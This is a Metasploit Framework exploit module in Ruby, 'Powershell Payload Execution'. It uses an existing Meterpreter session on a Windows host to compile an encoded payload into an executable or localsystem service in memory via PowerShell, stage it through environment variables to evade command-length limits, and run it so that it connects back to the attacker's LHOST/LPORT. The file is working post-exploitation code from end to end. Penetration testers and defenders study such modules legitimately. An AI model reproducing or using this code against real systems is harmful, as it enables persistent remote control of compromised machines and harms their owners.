
##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# Original script comments by nick[at]executionflow.org:
# Meterpreter script to deliver and execute powershell scripts using
# a compression/encoding method based on the powershell PoC code
# from rel1k and winfang98 at DEF CON 18. This script furthers the
# idea by bypassing Windows' command character lmits, allowing the
# execution of very large scripts. No files are ever written to disk.
##


require 'msf/core'
require 'msf/core/post/windows/powershell'
require 'msf/core/post/windows/powershell/dot_net'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Post::Windows::Powershell
	include Msf::Post::Windows::DotNet

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Powershell Payload Execution",
			'Description'          => %q{
				This module generates a dynamic executable on the session host using .NET templates.
				Code is pulled from C# templates and impregnated with a payload before being
				sent to a modified PowerShell session with .NET 4 loaded. The compiler builds
				the executable (standard or Windows service) in memory and produces an executable
				which can be started/installed and downloaded for later use. After compilation the 
				PoweShell session can also sign the executable if provided a path the a .pfx formatted
				certificate.
			},
			'License'              => MSF_LICENSE,
			'Version'              => '$Revision$',
			'Author'               => [
				'RageLtMan <rageltman[at]sempervictus>', # Module, libs, and powershell-fu
				'Matt "hostess" Andreko' # .NET harness, and instant modification on request
			],

			# 'DefaultOptions' =>	{
			# 	'EXITFUNC' => 'thread',
			# },
			'Payload'        =>  
				{   
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
				{   
					'BufferRegister' => 'EAX',
				},  
			},
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'Targets' => [ [ 'Universal', {} ] ],
			'DefaultTarget' => 0,

		))

		register_advanced_options(
			[
				OptBool.new('SERVICE', [false, 'Build a service, which defaults to running as localsystem', false ]),
				OptBool.new('START_APP', [false, 'Run EXE/Install Service', true ]),
				OptString.new('DOWNNLOAD_PATH', [false, 'Download the generated EXE here']),
				OptString.new('OUTPUT_TARGET', [false, 'Name and path of the generated executable, default random, omit extension' ]),

			], self.class)

	end

	def exploit

		# Make sure we meet the requirements before running the script, note no need to return
		# unless error
		return 0 if ! (session.type == "meterpreter" || have_powershell?)



		# End of file marker
		eof = Rex::Text.rand_text_alpha(8)
		env_suffix = Rex::Text.rand_text_alpha(8)
		com_opts = {}
		com_opts[:target] = datastore['OUTPUT_TARGET'] || session.fs.file.expand_path('%TEMP%') + "\\#{ Rex::Text.rand_text_alpha(rand(8)+8) }.exe"
		vprint_good("Writing to #{com_opts[:target]}")
		com_opts[:payload] = payload_script
		if datastore['SERVICE']
			com_opts[:harness] = File.join(Msf::Config.install_root, 'external', 'source', 'psh_exe', 'dot_net_service.cs')
			com_opts[:assemblies] = ['System.Configuration.Install.dll', 'System.Net.dll', 'System.Threading.dll', 'System.Timers.dll']
		else
			com_opts[:harness] = File.join(Msf::Config.install_root, 'external', 'source', 'psh_exe', 'dot_net_exe.cs')
		end

		print_status(com_opts.to_s)
		payload = dot_net_compiler(com_opts)


		# Compress
		vprint_good(payload)
		print_status('Compressing script contents:')
		compressed_script = compress_script(payload, eof)

		# If the compressed size is > 8100 bytes, launch stager
		if (compressed_script.size > 8100)
			print_error(" - Compressed size: #{compressed_script.size}")
			error_msg =  "Compressed size may cause command to exceed "
			error_msg += "cmd.exe's 8kB character limit."
			print_error(error_msg)
			print_status('Launching stager:')
			script = stage_to_env(compressed_script, env_suffix)
			print_good("Payload successfully staged.")
		else
			print_good(" - Compressed size: #{compressed_script.size}")
			script = compressed_script
		end

		# Execute the powershell script
		print_status('Executing the script.')
		cmd_out, running_pids, open_channels = execute_script(script, 90)
		clean_up(nil, eof, running_pids, open_channels, env_suffix, false)
		# if datastore['START_APP']
		# 	cmd_exec(target.gsub('\\','\\\\'))
		# end

		print_good('Finished!')
	end


	def payload_script
		pay_mod = framework.payloads.create(datastore['PAYLOAD'])
		payload = pay_mod.generate_simple(
			"BadChars"    => '',
			"Format"      => 'raw',
			"Encoder"     => 'x86/alpha_mixed',
			"ForceEncode" => true,
			"Options" => 
			 {
				'LHOST' => datastore['LHOST'],
				'LPORT' => datastore['LPORT'],
				'EXITFUNC' => 'thread',
				'BufferRegister' => 'EAX'
			},
		)

		#vprint_good("AlphanumMixed Encoded Payload:\n\n#{payload}\n\n")
		return payload
	end
end
